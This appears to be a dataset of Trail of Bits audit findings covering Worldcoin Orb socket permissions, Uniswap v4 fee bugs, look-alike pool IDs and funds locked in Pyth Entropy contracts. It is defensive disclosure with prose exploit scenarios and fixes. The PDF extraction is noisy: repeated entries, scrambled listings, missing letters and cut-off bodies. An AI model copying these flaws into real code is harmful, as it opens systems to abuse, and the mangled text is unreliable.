        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Aug 14 20 :57 60 Aug 16 13 :13 60 Mar 27 17 :54 60 Mar 27 17 :54 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Aug 16 13 :13 60 Mar 27 17 :54 60 Aug 14 20 :57 60 Mar 27 17 :54 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Mar 27 17 :54 60 Mar 27 17 :54 60 Aug 14 20 :57 60 Aug 16 13 :13 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Aug 16 13 :13 60 Aug 14 20 :57 60 Mar 27 17 :54 60 Mar 27 17 :54 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Aug 14 20 :57 60 Mar 27 17 :54 60 Mar 27 17 :54 60 Aug 16 13 :13 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Strict equality on fee comparison can cause fees to exceed 100% ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-uniswap-v4-core-securityreview.pdf",
        "body": "The usage of strict equality on the max fee validation can lead to acceptance of an incorrect fee. When performing a swap, the fee comprises a protocol and an LP fee, and is calculated through the calculateSwapFee function: swapFee = protocolFee == 0 ? lpFee : uint16(protocolFee).calculateSwapFee(lpFee); Figure 1.1: src/libraries/Pool.sol#L307 swapFee is represented as a percentage. It is checked to not be equal to 100% (MAX_LP_FEE): if (swapFee == LPFeeLibrary.MAX_LP_FEE && !exactInput) { InvalidFeeForExactOut.selector.revertWith(); } Figure 1.2: src/libraries/Pool.sol#L312-L314 Due to the usage of a strict equality (==), if the fee exceeds 100%, the validation passes, causing the fee to be greater than expected. Note that the issue is not currently exploitable, as:  We could not nd a realistic way to increase the fee above 100%.  The following operations in computeSwapStep would revert (e.g.,: MAX_FEE_PIPS - _feePips). This issues severity can be higher if combined with TOB-UNI4-2. Recommendations Short term, use >= instead of == when comparing the swap fee against its max value. Long term, create tests for which the dierent fee limits are not set to 100%.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Incorrect variable usage on swap fee ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-uniswap-v4-core-securityreview.pdf",
        "body": "The swap fee is compared against the max LP fee constant instead of the max swap fee constant. The swap fee is composed of two components: the protocol fee and the LP fee. swapFee is represented as a percentage. It is checked to not be equal to 100%: if (swapFee == LPFeeLibrary.MAX_LP_FEE && !exactInput) { InvalidFeeForExactOut.selector.revertWith(); } Figure 2.1: src/libraries/Pool.sol#L312-L314 However, the variable used for the comparison is the max LP fee (MAX_LP_FEE) instead of the max swap fee (MAX_FEE_PIPS): /// @notice the lp fee is represented in hundredths of a bip, so the max is 100% uint24 public constant MAX_LP_FEE = 1000000; Figure 2.2: src/libraries/LPFeeLibrary.sol#L24-L25 library SwapMath { uint256 internal constant MAX_FEE_PIPS = 1e6; Figure 2.3: src/libraries/SwapMath.sol#L9-L10 Both constants have the same value (10**6), so this issue is not an immediate threat to the protocol. However, this issues severity would be higher if combined with TOB-UNI4-1. Exploit scenario The LP fee is updated to be at maximum 10%, and the protocol fee is expected to be 5%. As the swap fee is capped at the LP fee amount (10%), the swap fee is incorrect. Recommendations Short term, use SwapMath.MAX_FEE_PIPS instead of LPFeeLibrary.MAX_LP_FEE when comparing the swap fee against its max value. Long term, create tests for which the dierent fee limits are not set to 100%.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Collected protocol fees may count against users currency deltas ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-uniswap-v4-core-securityreview.pdf",
        "body": "Uniswap v4s protocol-level fee collection operates outside of the currencyDelta model used by the rest of the protocol. This creates an opportunity for erroneous settle calculations if protocol fee collection is performed after sync is called, ultimately leading to an unexpected revert. When a user conducts a swap, position adjustment, or other action, it generates currencyDeltas for that user to represent the amount owed to the user or owed to the protocol. These currencyDeltas are cleared by calling sync(currency), paying the amount of debt owed, then calling settle. The sync and settle functions determine how much the user has paid by comparing the dierence between currency.balanceOfSelf when both sync and settle are called. If the user calls collectProtocolFees between sync and settle, the amount of fees paid to the recipient will erroneously count against the users currencyDelta, as if the user had called take or mint for the amount of fees paid. Exploit scenario The Uniswap DAO votes to turn on the protocol fee switch, and creates a contract that will harvest protocol fees and then swap them for the Uniswap Protocol governance token. The contract erroneously calls the collectProtocolFees function between sync and settle, and when determining how much needs to be paid to successfully settle the transaction, it manually calculates the currencyDelta. In this situation, the fee collection process either: 1. becomes a no-op that collects fees and burns them by sending them to the v4 singleton, or 2. the transaction reverts. Recommendations Short term, add a guard to the collectProtocolFees() function to prevent it from being called while the contract is unlocked, and add a guard to sync to ensure it can only be called when the singleton is unlocked. Alternatively, add comments or documentation regarding the safe use of collectPoolFees. Long term, add stateful properties to detect this kind of balance tampering attack in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Use of incorrect mask to clear higher bits of the protocolFee value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-uniswap-v4-core-securityreview.pdf",
        "body": "The calculateSwapFee function of the ProtocolFeeLibrary contract uses an incorrect mask of 0xffff to clear higher bits of the protocolFee value, which is a 12-bit value. The swap function of the Pool library contract loads the protocol fee from the storage variable slot0 of the singleton contract and calls one of the getZeroForOneFee or getOneForZeroFee functions to obtain the protocol fee percentage value: uint256 protocolFee = zeroForOne ? slot0Start.protocolFee().getZeroForOneFee() : slot0Start.protocolFee().getOneForZeroFee(); Figure 4.1: libraries/Pool.sol#L291-L292 The getZeroForOneFee function of the ProtocolFeeLibrary contract captures the lower 12 bits of the storage value and returns them in a uint16 type value: function getZeroForOneFee(uint24 self) internal pure returns (uint16) { return uint16(self & 0xfff); } Figure 4.2: libraries/ProtocolFeeLibrary.sol#L17-L19 Next, the swap function of the Pool library contract calls the calculateSwapFee function on the protocolFee variable of type uint16 to compute the swap fee amount, combining the protocol fee and liquidity provider fee. However, the calculateSwapFee function assumes the value of the self variable, which is the protocolFee variable, to be of 16-bit length instead of 12-bit length and uses a mask of 0xffff instead of 0xfff to clear higher bits of the provided value: function calculateSwapFee(uint16 self, uint24 lpFee) internal pure returns (uint24 swapFee) { // protocolFee + lpFee - (protocolFee * lpFee / 1_000_000). Div rounds up to favor LPs over the protocol. assembly (\"memory-safe\") { self := and(self, 0xffff) lpFee := and(lpFee, 0xffffff) let numerator := mul(self, lpFee) let divRoundingUp := add(div(numerator, PIPS_DENOMINATOR), gt(mod(numerator, PIPS_DENOMINATOR), 0)) swapFee := sub(add(self, lpFee), divRoundingUp) } } Figure 4.3: libraries/ProtocolFeeLibrary.sol#L38-L47 Usage of an incorrect mask does not lead to incorrect calculations or nancial loss in the current implementation because of correct masking in the getZeroForOneFee or getOneForZeroFee functions. It could lead to a higher fee being charged to the user if the calculateSwapFee function was called on a uint16 value that did not have its upper four bits cleared. Recommendations Short term, use the correct mask 0xfff to clear higher bits of the protocolFee value and document this behavior in inline code comments. Long term, consider actual limits of values instead of the types when sanitizing the values for arithmetic operations. 5. Insu\u0000cient event generation Severity: Informational Diculty: Low Type: Auditing and Logging Finding ID: TOB-UNI4-5 Target: Various",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Use of incorrect mask to clear higher bits of the protocolFee value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-uniswap-v4-core-securityreview.pdf",
        "body": "The calculateSwapFee function of the ProtocolFeeLibrary contract uses an incorrect mask of 0xffff to clear higher bits of the protocolFee value, which is a 12-bit value. The swap function of the Pool library contract loads the protocol fee from the storage variable slot0 of the singleton contract and calls one of the getZeroForOneFee or getOneForZeroFee functions to obtain the protocol fee percentage value: uint256 protocolFee = zeroForOne ? slot0Start.protocolFee().getZeroForOneFee() : slot0Start.protocolFee().getOneForZeroFee(); Figure 4.1: libraries/Pool.sol#L291-L292 The getZeroForOneFee function of the ProtocolFeeLibrary contract captures the lower 12 bits of the storage value and returns them in a uint16 type value: function getZeroForOneFee(uint24 self) internal pure returns (uint16) { return uint16(self & 0xfff); } Figure 4.2: libraries/ProtocolFeeLibrary.sol#L17-L19 Next, the swap function of the Pool library contract calls the calculateSwapFee function on the protocolFee variable of type uint16 to compute the swap fee amount, combining the protocol fee and liquidity provider fee. However, the calculateSwapFee function assumes the value of the self variable, which is the protocolFee variable, to be of 16-bit length instead of 12-bit length and uses a mask of 0xffff instead of 0xfff to clear higher bits of the provided value: function calculateSwapFee(uint16 self, uint24 lpFee) internal pure returns (uint24 swapFee) { // protocolFee + lpFee - (protocolFee * lpFee / 1_000_000). Div rounds up to favor LPs over the protocol. assembly (\"memory-safe\") { self := and(self, 0xffff) lpFee := and(lpFee, 0xffffff) let numerator := mul(self, lpFee) let divRoundingUp := add(div(numerator, PIPS_DENOMINATOR), gt(mod(numerator, PIPS_DENOMINATOR), 0)) swapFee := sub(add(self, lpFee), divRoundingUp) } } Figure 4.3: libraries/ProtocolFeeLibrary.sol#L38-L47 Usage of an incorrect mask does not lead to incorrect calculations or nancial loss in the current implementation because of correct masking in the getZeroForOneFee or getOneForZeroFee functions. It could lead to a higher fee being charged to the user if the calculateSwapFee function was called on a uint16 value that did not have its upper four bits cleared. Recommendations Short term, use the correct mask 0xfff to clear higher bits of the protocolFee value and document this behavior in inline code comments. Long term, consider actual limits of values instead of the types when sanitizing the values for arithmetic operations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Insu\u0000cient event generation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-uniswap-v4-core-securityreview.pdf",
        "body": "Multiple critical operations do not emit events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. The following operation should trigger events:  PoolManager  updateDynamicLPFee The following operation should modify events:  PoolManager  The initialize function should include sqrtPriceX96 as an event parameter if it emits. The following operations may also be considered to trigger events. If they do not, they should be documented properly.  PoolManager  donate  settle  take Recommendations Short term, add events for all operations that could contribute to a higher level of monitoring and alerting. If certain operations are not set up to emit events to optimize gas usage, they should be comprehensively documented. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Similar-looking pool IDs can be brute-forced through the PoolKey hooks elds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-07-uniswap-v4-core-securityreview.pdf",
        "body": "Similar-looking pool IDs can be brute-forced by using the PoolKey.hooks eld as a nonce. Attackers could use this to trick users into using their malicious pools. This does not aect the Uniswap v4 protocol; however, this does impact third-party integrators, which should try to minimize users falling victim to using malicious pools. Pools can be freely created in Uniswap v4 through the PoolManager.initialize function. Each Pool has ve elds (see gure 6.1), and the hash of these results in the pools ID (see gure 6.2). 8 9 10 11 12 13 struct PoolKey { /// @notice The lower currency of the pool, sorted numerically Currency currency0; /// @notice The higher currency of the pool, sorted numerically Currency currency1; /// @notice The pool swap fee, capped at 1_000_000. If the highest bit is 1, the pool has a dynamic fee and must be exactly equal to 0x800000 14 15 spacing uint24 fee; /// @notice Ticks that involve positions must be a multiple of tick 16 17 18 19 9 10 11 int24 tickSpacing; /// @notice The hooks of the pool IHooks hooks; } Figure 6.1: The PoolKey struct in types/PoolKey.sol#L8-L19 library PoolIdLibrary { /// @notice Returns value equal to keccak256(abi.encode(poolKey)) function toId(PoolKey memory poolKey) internal pure returns (PoolId poolId) { 12 13 14 15 16 assembly (\"memory-safe\") { poolId := keccak256(poolKey, mul(32, 5)) } } } Figure 6.2: Hashing of the PoolKey struct in types/PoolId.sol#L9-L16 An attacker can create a pool with a malicious Hooks contract that looks similar to a legitimate victim pool by fullling the following requirements:",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Mar 27 17 :54 60 Aug 14 20 :57 60 Mar 27 17 :54 60 Aug 16 13 :13 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Mar 27 17 :54 60 Aug 14 20 :57 60 Aug 16 13 :13 60 Mar 27 17 :54 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Deposited assets cannot be withdrawn ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-01-pyth-entropy-securityreview.pdf",
        "body": "The Entropy and Executor contracts can receive native asset deposits but cannot withdraw them, permanently locking the funds in the contracts. The Entropy contract allows users to request random numbers from a randomness provider by calling the Entropy contracts request function. To make a request, the user must pay a fee, which consists of the provider-dened fee and the Pyth protocol fee, as shown in the highlighted lines of gure 1.1. function request ( address provider , bytes32 userCommitment , bool useBlockHash ) public payable override returns ( uint64 assignedSequenceNumber ) { EntropyStructs.ProviderInfo storage providerInfo = _state.providers[ provider ]; if (_state.providers[provider].sequenceNumber == 0 ) revert EntropyErrors.NoSuchProvider(); // Assign a sequence number to the request assignedSequenceNumber = providerInfo.sequenceNumber; if (assignedSequenceNumber >= providerInfo.endSequenceNumber) revert EntropyErrors.OutOfRandomness(); providerInfo.sequenceNumber += 1 ; // Check that fees were paid and increment the pyth / provider balances. uint128 requiredFee = getFee(provider); if ( msg.value < requiredFee) revert EntropyErrors.InsufficientFee(); providerInfo.accruedFeesInWei += providerInfo.feeInWei; _state.accruedPythFeesInWei += (SafeCast.toUint128( msg.value ) - providerInfo.feeInWei); [...] } Figure 1.1: The request function of Entropy.sol While providers can withdraw their accrued fees by using the Entropy contracts withdraw function, the contract does not implement a way for the Pyth protocol fee to be withdrawn. This results in the protocol fee being permanently locked in the contract. This issue is also present in the Executor contract, which is designed to execute arbitrary messages that were veried by the Wormhole cross-chain bridge. The bridge can receive native assets because it implements a payable receive function, as shown in gure 1.2. /// @dev Called when `msg.value` is not zero and the call data is empty. receive() external payable {} Figure 1.2: The payable receive function of Executor.sol However, the Executor contracts execute function cannot send value with the executed low-level call, as shown in gure 1.3. function execute ( bytes memory encodedVm ) public returns ( bytes memory response) { IWormhole.VM memory vm = verifyGovernanceVM(encodedVm); GovernanceInstruction memory gi = parseGovernanceInstruction( vm.payload ); if (gi.targetChainId != chainId && gi.targetChainId != 0 ) revert ExecutorErrors.InvalidGovernanceTarget(); if ( gi.action != ExecutorAction.Execute || gi.executorAddress != address ( this ) ) revert ExecutorErrors.DeserializationError(); bool success ; (success, response) = address (gi.callAddress).call(gi.callData); [...] } Figure 1.3: The execute function of Executor.sol No additional mechanism for withdrawing the value is implemented inside the contract, so any native assets deposited to the 